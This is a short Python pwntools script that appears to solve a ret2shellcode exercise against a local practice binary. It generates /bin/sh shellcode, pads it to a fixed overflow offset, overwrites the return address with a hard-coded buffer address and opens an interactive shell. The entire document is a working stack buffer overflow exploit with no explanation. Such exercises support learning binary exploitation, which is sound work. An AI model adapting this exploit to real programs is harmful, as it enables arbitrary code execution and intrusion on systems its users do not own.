from pwn import *

buf2_addr = 0x0804a080
offset = 0x6c + 4
shellcode = asm(shellcraft.sh())
payload = shellcode + b'A'*(offset - len(shellcode)) + p32(buf2_addr)

sh = process(r"../ex1/ret2shellcode")
sh.sendline(payload)
sh.interactive()
